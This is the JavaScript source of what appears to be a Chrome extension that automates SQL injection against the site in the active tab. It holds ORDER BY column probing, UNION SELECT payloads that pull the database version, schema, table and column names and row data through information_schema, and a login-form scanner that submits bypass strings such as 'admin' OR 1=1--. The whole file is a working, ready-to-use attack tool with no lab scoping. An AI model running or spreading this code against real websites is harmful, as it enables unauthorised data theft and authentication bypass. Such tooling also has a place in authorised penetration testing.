var currentURL;

var splitUrl;

var baseUrl;

var newUrl;

var tableName;

var columnInfo;

var allTables;

var allColumns;

var databaseName;

var versionName;

var columnInfomation = [];

var tableArray = [];

var columnArray = [];

var intOrderBy;
// payload array for username, password & form injection
var payloads = ["'", "admin' OR 1=1--", "admin'", "admin'--", "--", "#", "admin' OR 1=1#"];

// error array for username, password & form injection (when webpage returns SQL error with payload)
var errors = ["Syntax error:", "SQL syntax", "Lexical error"];

// login error array for username, password & form injection (when user is able to login with payload)
var loginErrors = ["Sign Off", "Log Off"];

// split the current url and get the column number where database information will be nested
document.getElementById("start").addEventListener("click", function(){
  splitCurrentUrl();
  enumerateColumn();
});
// get the list of tables in the database and create a table drop down list
document.getElementById("tableBtn").addEventListener("click", enumerateTable);
// get the value from the table drop down list
document.getElementById("tableRow").addEventListener("click", getTableInput);
// get the column and column type from the table
document.getElementById("tableInfo").addEventListener("click", enumerateTableInfo);
// get the column information form the table
document.getElementById("tableColumnInfo").addEventListener("click", enumerateColumnInfo);
// get the value from the checked checkboxes
document.getElementById("getTableColumn").addEventListener("click", getColumnInfo);
// get all the input field on the webpage
document.getElementById("getInputField").addEventListener("click", getInputField);

chrome.tabs.query({'active': true, 'windowId': chrome.windows.WINDOW_ID_CURRENT}, 
function(tabs){
	getCurrentURL(tabs[0].url);
	window.location = currentURL;
});
// function to get current URL
function getCurrentURL(tab){
	currentURL = tab;
    document.getElementById("urlName").value=currentURL;
}
// enumerate webpage to find the number of columns
async function enumerateColumn() {
  var OrderBy = 1;
  var MaxOrderBy = 999;
  // 
  const getColumnRegex = /mysql_fetch_array\(\)|internal server error/i;
  // increment webpage https://example.com/product.php?id=1 order by 1 
  while (OrderBy <= MaxOrderBy) {
    // concatenate the currentURL and payload
    const newUrl = currentURL + "%20order%20by%20" + OrderBy;
    console.log(newUrl);
    
    try {
      // fetch the newUrl and retreive it's content
      const response = await fetch(newUrl);
      const data = await response.text();
      // check if getColumnRegex is in the newUrl content
      if (getColumnRegex.test(data)) {
        // create a text node to display the column number
		    intOrderBy = parseInt(OrderBy) - 1
		    const columnNoNode = document.createTextNode("Total column: " + intOrderBy.toString());
		    const element = document.getElementById('columnNo');
		    element.appendChild(columnNoNode);
        break;
      }
      // check if response is 404 and create a text node to display error
      else if(response.status === 404){
        const errorMsg = document.createElement("p");
        const errorMsgNode = document.createTextNode("Error! Please enter a valid URL!");
        errorMsg.appendChild(errorMsgNode);
        const element = document.getElementById('columnNo');
        element.appendChild(errorMsg);
        break;
      }
    } catch (error) {
      // create a text node to display error
      const errorMsg = document.createElement("p");
      const errorMsgNode = document.createTextNode("Error! Please enter a valid URL!");
      errorMsg.appendChild(errorMsgNode);
      const element = document.getElementById('columnNo');
      element.appendChild(errorMsg);
      break;
    }
    // increment the webpage order
    OrderBy++;
  }
  // get database version
  enumerateDatabaseVersion();
  // get all the database
  enumerateDatabase();
}
// get database version
function enumerateDatabaseVersion(){
  // payload to get the database version wrapped with {{}}
  const payload = "group_concat(0x7b,0x7b,version(),0x7d,0x7d)";
  // concatenate the baseUrl and payload with the number of columns
	const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
  // display the URL in the console
	console.log(newUrl);

  // fetch the newUrl and retreive it's content
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // count the data wrapped in {{}} and retrieve the version
    versionName = countData(data, versionName);
    // create a text node to display the database version in the div with id version
    const databaseNode = document.createTextNode("Database version: " + versionName);
		const element = document.getElementById('version');
    element.appendChild(databaseNode);
  })
  .catch(error => console.log(error));
}
// get all the database name
function enumerateDatabase(){
  // payload to get the database name wrapped with {{}}
  const payload = "group_concat(0x7b,0x7b,database(),0x7d,0x7d)";
  // concatenate the baseUrl and payload with the number of columns
	const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"
  // display the URL in the console
	console.log(newUrl);

  // fetch the newUrl and retreive it's content
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // count the data wrapped in {{}} and retrieve all the databases
    databaseName = countData(data, databaseName);
    // create a text node to display the database in the div with id database
    const databaseNode = document.createTextNode("Database found: " + databaseName);
		const element = document.getElementById('database');
    element.appendChild(databaseNode);
  })
  .catch(error => console.log(error));
}
// get all the table name
function enumerateTable(){
  // payload to all the table name wrapped with {{}}
  const payload = "concat(0x7b,0x7b,group_concat(table_name),0x7d,0x7d)";
  // concatenate the baseUrl and payload with the number of columns
  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.tables%20where%20table_schema=%27"+databaseName+"%27";
  // display the URL in the console
	console.log(newUrl);

  // fetch the newUrl and retreive it's content
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // count the data wrapped in {{}} and retrieve all the tables in database
    allTables = countData(data, allTables);
    // get id table-container in index
    const formContainer = document.getElementById("table-container");
    // split the tables when more tables are present in the database
    tableArray = allTables.split(",");
    // get id tableName in index
    const table = document.getElementById('tableName');
    // check if tag name ul exists in the index and remove it
    let tableTable = document.getElementsByTagName("ul");
    if(tableTable.length > 0){
      for (let i = tableTable.length - 1; i >= 0; i--) {
        // remove ul tag name
        tableTable[i].remove();
      }
    }
    // create new ul tag name in index
    tableTable = document.createElement("ul");
    // create new li tag name for each tables and add it to ul tag name
    tableArray.forEach(tableName => {
       const tableList = document.createElement("li");
       const tableNameNode = document.createTextNode(tableName);
       tableList.appendChild(tableNameNode);
       tableTable.appendChild(tableList);
    })
    // add the ul tab into the id tableName
    table.appendChild(tableTable);
    // create a dropdown list
    const dropdown = document.createElement("select");
    // downdown id table-dropdown
    dropdown.id = "table-dropdown";
    
    // create default options for the dropdown list
    const defaultOption = document.createElement("option");
    defaultOption.textContent = "Select a table";
    defaultOption.disabled = true;
    defaultOption.selected = true;
    dropdown.appendChild(defaultOption);
    // create option for dropdown list for each tables retrieve
    tableArray.forEach(function(table) {
      const option = document.createElement("option");
      option.textContent = table;
      option.value = table;
      dropdown.appendChild(option);
    });
    // add the dropdown into id table-container
    formContainer.appendChild(dropdown);
  })
  .catch(error => console.log(error));
}
// get all table column information
function enumerateTableInfo(){
  // payload to all the table column information wrapped with {{}}
  const payload = "concat(0x7b,0x7b,group_concat(column_name,0x3a,column_type),0x7d,0x7d)";
  // concatenate the baseUrl and payload with the number of columns
  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.columns%20where%20table_name=%27"+tableName+"%27";
  // display the URL in the console
	console.log(newUrl);

  // fetch the newUrl and retreive it's content
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // count the data wrapped in {{}} and retrieve all table column information
    allColumns = countData(data, allColumns);
     // split the columns when there are more than 1 column in table
    columnArray = allColumns.split(",");
    // get id table from index
    const table = document.getElementById('table');
    // check if tag name tr exists in the index and remove it
    let tableTable = document.getElementsByTagName("tr");
    if(tableTable.length > 0){
      for (let i = tableTable.length - 1; i >= 0; i--) {
        // remove tr tag name
        tableTable[i].remove();
      }
    }
    // create new tr tag name in index
    tableTable = document.createElement("tr");
    // create two th with name column and type
    const tableColumn = document.createElement("th");
    const tableType = document.createElement("th");
    const columnName = document.createTextNode("Column");
    const typeName = document.createTextNode("Type");
    // add them to id table
    tableColumn.appendChild(columnName);
    tableType.appendChild(typeName);
    tableTable.appendChild(tableColumn);
    tableTable.appendChild(tableType);
    table.appendChild(tableTable);
    // create two td tag name for each column and type respectively and add it to tr tag name
    columnArray.forEach((allColumns) => {
      const[column, type] = allColumns.split(":");
      const tableTable = document.createElement("tr");
      const tableColumn = document.createElement("td");
      const tableType = document.createElement("td");
      const columnName = document.createTextNode(column);
      const typeName = document.createTextNode(type);
      tableColumn.appendChild(columnName);
      tableType.appendChild(typeName);
      // create a checkbox for each a pair of column and type
      const tableCheckbox = document.createElement("td");
      const checkbox = document.createElement("input");
      checkbox.type = "checkbox";
      checkbox.name = "checkbox";
      checkbox.value = column;
      tableCheckbox.appendChild(checkbox);
      // add the checkbox into id table
      tableTable.appendChild(tableColumn);
      tableTable.appendChild(tableType);
      tableTable.appendChild(tableCheckbox);
      table.appendChild(tableTable);
    })
  })
  .catch(error => console.log(error));
}
// get column information
function enumerateColumnInfo(){
  // get id table from index
  const table = document.getElementById('tables');
  // create a tr tag name
  const tableColumnHeader = document.createElement('tr');

    let i = 0;
    // create a th tag name for each item in columnInformation array and add them to the th tag name
    while(i < columnInfomation.length){
      const tableColumnHeaderCell = document.createElement('th');
      const tableColumnHeaderText = document.createTextNode(columnInfomation[i]);
      
      tableColumnHeaderCell.appendChild(tableColumnHeaderText);
      tableColumnHeader.appendChild(tableColumnHeaderCell);
      i++;
    }
    table.appendChild(tableColumnHeader);
  // split the with : 
  const newColumnInformation = columnInfomation.map(item => `${item},0x3a`).join(',');
  const modifiedColumnInformation = newColumnInformation.replace(/(.*)(0x3a)/, '$1' + '0x3b');
  // payload for the table column information wrapped with {{}}
  const payload = "concat(0x7b,0x7b,group_concat("+modifiedColumnInformation+"),0x2c,0x7d,0x7d)"
  // concatenate the baseUrl and payload with the number of columns
  const newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20"+tableName;
  // display the URL in the console
	console.log(newUrl);

  // fetch the newUrl and retreive it's content
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // count the data wrapped in {{}} and retrieve all column information
    columnInfo = countData(data, columnInfo);
     // split the columns when there are more than 1 column in table
    const tableRow = columnInfo.split(";,");
    // get id tables from index
    const table = document.getElementById('tables');
    // create new tr tag name for each row and td tag name for each col of data
    tableRow.forEach(row => {
      // split row with :
      const column = row.split(":");
      const newRow = document.createElement("tr");
      column.forEach(col =>{
        const newCell = document.createElement("td");
        const cellTextNode = document.createTextNode(col);
        newCell.appendChild(cellTextNode);
        newRow.appendChild(newCell);
      })
      table.appendChild(newRow);
    });
    // reset column information array
    columnInfomation = [];
  })
  .catch(error => console.log(error));
  
}
// get the checked checkboxes from the table column
function getColumnInfo(){
  const checkboxes = document.getElementsByName("checkbox");
  const selectedCheckboxes = [];

  checkboxes.forEach((checkbox) => {
    if (checkbox.checked) {
      columnInfomation.push(checkbox.value);
    }
  });
  console.log(columnInfomation);
  return selectedCheckboxes;
}
// get the selected table from drop down list
function getTableInput(){
  const tableField = document.getElementById('table-dropdown');
  tableName = tableField.value;
}
// get the payload length by checking the number of columns and concatenate the payload together with ,
function generatePayloadLength(columnNumber, payload){
  const payloadArray = new Array(columnNumber).fill(payload);
  return payloadArray.join(",");
}

// split the URL https://example.com/product.php?id=1 into https://example.com/product.php?id and 1
function splitCurrentUrl(){
  // split the URL https://example.com/product.php?id=1 into https://example.com/product.php?id and 1
  splitUrl = currentURL.split('=');
  // get baseUrl https://example.com/product.php?id
  baseUrl = splitUrl[0];
}

// count the occurence of data wrapped in {{}}
function countData(data, output){
  // replace the HTML tag of the content with a blank space
  const textContent = data.replace(/<[^>]+>/g, " ");

  // extract database version wrapped with {{}}
  const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
  const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

   // count the number of words in {{}}
  const wordCountMap = {};
  for (let i = 0; i < wordValue.length; i++) {
    const word = wordValue[i];
    wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
  }
  // Find the word with the highest count
  let maxCount = 0;
  output = "";
  for (const word in wordCountMap) {
    if (wordCountMap[word] > maxCount) {
      maxCount = wordCountMap[word];
      output = word;
    }
  }
  return output
}

// form SQLi
// generate input field on chrome extension
function getInputField(){
  // fetch the current url and retreieve it's content
  fetch(currentURL)
    .then(response => response.text())
    .then(data => {
      // create a new html document from the retrieved content
      const doc = new DOMParser().parseFromString(data, "text/html");
      // get the id form-container from index
      const formContain = document.getElementById("form-container");
      // get all the form elements on the webpage
      const formElements = doc.getElementsByTagName("form");
      // iterate each form element and create a separate container for each form
      for (let i = 0; i < formElements.length; i++) {
        const form = formElements[i];
        // create div tag name for form
        const formContainer = document.createElement("div");
        formContainer.id = form.id;
        // enumerate input fields and add them to form container
        const inputFields = form.getElementsByTagName("input");
        for (let j = 0; j < inputFields.length; j++) {
          const inputField = inputFields[j];
          if (inputField.type === "text" || inputField.type === "password") {
            // create input tag name
            const inputElement = document.createElement("input");
            inputElement.type = "text";
            inputElement.placeholder = inputField.name;
            inputElement.id = inputField.id;
            // create dropdown list
            const dropdown = document.createElement("select");
            dropdown.id = inputField.id + "-dropdown";

            // create options for the dropdown list
            const defaultOption = document.createElement("option");
            defaultOption.textContent = "Select a value";
            defaultOption.disabled = true;
            defaultOption.selected = true;
            dropdown.appendChild(defaultOption);
            // create options for the dropdown list using payloads array
            payloads.forEach(function (payload) {
              const option = document.createElement("option");
              option.textContent = payload;
              dropdown.appendChild(option);
            });

            // event listener for dropdown list to update input field when an option is selected
            dropdown.addEventListener("change", function () {
              inputElement.value = this.value;
            });
            // create div tag name and add it to newly created div tag name
            const inputContainer = document.createElement("div");
            inputContainer.appendChild(dropdown);
            inputContainer.appendChild(inputElement);
            formContainer.appendChild(inputContainer);
          }
        }
        // create button to scan vulnerabilty with selected payload on the webpage
        const scanSqlButton = document.createElement("button");
        scanSqlButton.textContent = "SQLi vulnerability Scan";
        scanSqlButton.addEventListener("click", function () {
          const formContainer = this.parentNode;
          checkSQLInjection(formContainer.id);
        });
        // create button to scan vulnerabilty with all payload on the webpage
        const scanFullSqlButton = document.createElement("button");
        scanFullSqlButton.textContent = "Full SQLi vulnerability Scan";
        scanFullSqlButton.addEventListener("click", function () {
          const formContainer = this.parentNode;
          checkAllSQLInjection(formContainer.id);
        });
        // add buttons to id form-container
        formContainer.appendChild(scanSqlButton);
        formContainer.appendChild(scanFullSqlButton);
        formContain.appendChild(formContainer);
      }
    })
    .catch(error => console.log(error));
    
}
// scan vulnerabilty with selected payload on the webpage
function checkSQLInjection(formContainer) {
  // fetch the current url and retreieve it's content
  fetch(currentURL)
  .then(function(response) {
    return response.text();
  })
  .then(function(html) {
    // create dummy dom element to parse the html string
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    // get the form with id from formContainer
    const loginForm = doc.getElementById(formContainer);
    // get path name of id from formContainer
    const loginAction = new URL(loginForm.action).pathname;
   // split the URL https://example.com/product.php into https://example.com/ and product.php
    const splitUrl = currentURL.split('/');
    // ensure URl is https://example.com
    const domain = splitUrl.slice(0, -1).join('/');
    let newUrl = "";  
    // check if the path name from loginAction has .
    if(loginAction.includes('.')){
      const fileExtension = loginAction.split('.').pop();
      if(fileExtension === 'php' || fileExtension === 'com' || fileExtension === 'jsp'){
        // concatenate https://example.com with the path name
        newUrl = domain + loginAction;
      }
      else{
        // concatenate https://example.com with the path name
        newUrl = domain + loginAction;
      }
    }
    else{
      // concatenate https://example.com with the path name
      newUrl = domain + loginAction;
    }
    console.log(newUrl);
    // get all input field with type text, password or email
    const inputFields = loginForm.querySelectorAll('input[type=text], input[type=password], input[type=email]');

    const payloadObj = {};
    // loop to get all the value of the input field and add them to payloadObj array
    inputFields.forEach(function(input){
      const inputName = input.getAttribute('name');
      const inputValue = document.getElementById(inputName).value;
      input.value = inputValue;
      payloadObj[inputName] = inputValue;
    })
    // get the value of the button with input field type submit
    const buttonFields = loginForm.querySelector('input[type=submit]')
    const buttonName = buttonFields.getAttribute('name');
    const buttonValue = buttonFields.value;
    // check if button exist
    if(!buttonName){
      
    }
    else{
      // add button to payloadObj array
      payloadObj[buttonName] = buttonValue;
    }
    // create new XMLHttpRequest object
    const xhr = new XMLHttpRequest();
    // set request method
    xhr.open('POST', newUrl);
    // set request header to send form data
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    // create payload with injected SQL code
    // convert the payload object to a string
    const payloadStr = Object.keys(payloadObj).map(key => {
      return encodeURIComponent(key) + '=' + encodeURIComponent(payloadObj[key]);
    }).join('&');
    // add event listener to handle the response
    xhr.addEventListener('load', function() {
      // get response text and response url
      const responseText = xhr.responseText;
      const responseUrl = xhr.responseURL;
      let responseErrorText = ""
      // check if response text content items from errors array
      if (errors.some(error => responseText.toLowerCase().includes(error.toLowerCase()))) {
        // loop payloadObj and search for name or id of each input field
        Object.keys(payloadObj).forEach(function(key) {
          const fieldValue = payloadObj[key];
          const fieldName = key.toLowerCase();
          // check if field value is the same as payloads array and print the response error
          if (payloads.includes(fieldValue)) {
            responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
          }
        });
      }
      // check if response url is the same as current url
      else if(responseUrl !== currentURL){
        // check if response text content items from loginErrors array
        if(loginErrors.some(loginErrors => responseText.toLowerCase().includes(loginErrors.toLowerCase()))){
          // loop payloadObj and search for name or id of each input field
          Object.keys(payloadObj).forEach(function(key) {
            const fieldValue = payloadObj[key];
            const fieldName = key.toLowerCase();
            // check if field value is the same as payloads array and print the response error    
            if (payloads.includes(fieldValue)) {
              responseErrorText = 'Log in to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
            }
          });
        }
        else{
          // loop payloadObj and search for name or id of each input field
          Object.keys(payloadObj).forEach(function(key) {
            const fieldValue = payloadObj[key];
            const fieldName = key.toLowerCase(); 
            // check if field value is the same as payloads array and print the response error      
            if (payloads.includes(fieldValue)) {
              responseErrorText = 'Redirected to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
              console.log('Redirected to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
            }
          });
        }
      }
      else{
        // loop payloadObj and search for name or id of each input field
        Object.keys(payloadObj).forEach(function(key) {
          const fieldValue = payloadObj[key];
          const fieldName = key.toLowerCase();
          if (payloads.includes(fieldValue)) {
            responseErrorText = 'Error getting response with ' + fieldName + ' field with payload "' + fieldValue + '".'
          }
        })
      }
      // add the response error text into index
      const responseError = document.createElement("p");
      const responseErrorNode = document.createTextNode(responseErrorText);
      responseError.appendChild(responseErrorNode);
      const element = document.getElementById('responseError');
      element.appendChild(responseError);
    });
    // send the payload and submit the form
    xhr.send(payloadStr);
    loginForm.submit();
    // abort the xhr in 5 seconds
    setTimeout(() => {
      xhr.abort();
    }, 5000);
  })
  .catch(function(error) {
    console.log(error);
  });
}
// scan vulnerabilty with all payload on the webpage
function checkAllSQLInjection(formContainer) {
  // fetch the current url and retreieve it's content
  fetch(currentURL)
  .then(function(response) {
    return response.text();
  })
  .then(function(html) {
    // create dummy dom element to parse the html string
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    // get the form with id from formContainer
    const loginForm = doc.getElementById(formContainer);
    // get path name of id from formContainer
    const loginAction = new URL(loginForm.action).pathname;
   // split the URL https://example.com/product.php into https://example.com/ and product.php
    const splitUrl = currentURL.split('/');
    // ensure URl is https://example.com
    const domain = splitUrl.slice(0, -1).join('/');
    let newUrl = "";  
    // check if the path name from loginAction has .
    if(loginAction.includes('.')){
      const fileExtension = loginAction.split('.').pop();
      if(fileExtension === 'php' || fileExtension === 'com' || fileExtension === 'jsp'){
        // concatenate https://example.com with the path name
        newUrl = domain + loginAction;
      }
      else{
        // concatenate https://example.com with the path name
        newUrl = domain + loginAction;
      }
    }
    else{
      // concatenate https://example.com with the path name
      newUrl = domain + loginAction;
    }
    console.log(newUrl);
    // get all input field with type text, password or email
    const inputFields = loginForm.querySelectorAll('input[type=text], input[type=password], input[type=email]');

    const payloadObj = {};
    // loop to get all the value of the input field and add them to payloadObj array
    inputFields.forEach(function(input){
      const inputName = input.getAttribute('name');
      const inputValue = document.getElementById(inputName).value;
      // check if inputValue is null if null the input value is 123
      if(!inputValue){
        input.value = "123";
        payloadObj[inputName] = "123";
      }
      else{
        input.value = inputValue;
        payloadObj[inputName] = inputValue;
      }
      
    })
    // get the value of the button with input field type submit
    const buttonFields = loginForm.querySelector('input[type=submit]')
    const buttonName = buttonFields.getAttribute('name');
    const buttonValue = buttonFields.value;
    // check if button exist
    if(!buttonName){
      
    }
    else{
      // add button to payloadObj array
      payloadObj[buttonName] = buttonValue;
    }
    // loop over input fields
    for (const input of inputFields) {
      const inputName = input.getAttribute('name');

      // loop over payloads
      for (const payload of payloads) {
        // create copy of the payload object to modify
        const newPayloadObj = { ...payloadObj };
        newPayloadObj[inputName] = payload;

        // create payload string
        const payloadStr = Object.entries(newPayloadObj)
          .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
          .join('&');
        // create new XMLHttpRequest object
        const xhr = new XMLHttpRequest();
        // set request method
        xhr.open('POST', newUrl);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.addEventListener('load', function() {
          // get response text and response url
          const responseText = xhr.responseText;
          const responseUrl = xhr.responseURL;
          let responseErrorText = ""
          // check if response text content items from errors array
          if (errors.some(error => responseText.toLowerCase().includes(error.toLowerCase()))) {
            // loop newPayloadObject and search for name or id of each input field
            Object.keys(newPayloadObj).forEach(function(key) {
              const fieldValue = newPayloadObj[key];
              const fieldName = key.toLowerCase();
              if (payloads.includes(fieldValue)) {
              // check if the response text contains the name or ID of the input field
                responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
              }
            });
          }
          // check if response url is the same as current url
          else if(responseUrl !== currentURL){
            if(loginErrors.some(loginErrors => responseText.toLowerCase().includes(loginErrors.toLowerCase()))){
              // loop newPayloadObject and search for name or id of each input field
              Object.keys(newPayloadObj).forEach(function(key) {
                const fieldValue = newPayloadObj[key];
                const fieldName = key.toLowerCase(); 
                // check if field value is the same as payloads array and print the response error 
                if (payloads.includes(fieldValue)) {
                  responseErrorText = 'Log in to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
                  console.log(responseErrorText)
                  console.log('Log in to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
                }
              });
            }
            else{
              // loop newPayloadObject and search for name or id of each input field
              Object.keys(newPayloadObj).forEach(function(key) {
                const fieldValue = newPayloadObj[key];
                const fieldName = key.toLowerCase();
                // check if field value is the same as payloads array and print the response error          
                if (payloads.includes(fieldValue)) {
                  responseErrorText = 'Redirected to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
                  console.log(responseErrorText)
                  console.log('Redirected to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
                }
              });
            }
          }
          // loop newPayloadObject and search for name or id of each input field
          else{
            Object.keys(newPayloadObj).forEach(function(key) {
              const fieldValue = newPayloadObj[key];
              const fieldName = key.toLowerCase();
              // check if field value is the same as payloads array and print the response error 
              if (payloads.includes(fieldValue)) {
                responseErrorText = 'Error getting response with ' + fieldName + ' field with payload "' + fieldValue + '".'
              }
            })
          }
           // add the response error text into index
          const responseError = document.createElement("p");
          const responseErrorNode = document.createTextNode(responseErrorText);
          responseError.appendChild(responseErrorNode);
          const element = document.getElementById('responseError');
          element.appendChild(responseError);
        });
        // send the payload and submit the form
        xhr.send(payloadStr); 
          loginForm.submit();
          // abort the xhr in 5 seconds
          setTimeout(() => {
            xhr.abort();
          }, 5000);
      }
    }
  })
  .catch(function(error) {
    console.log(error);
  });
}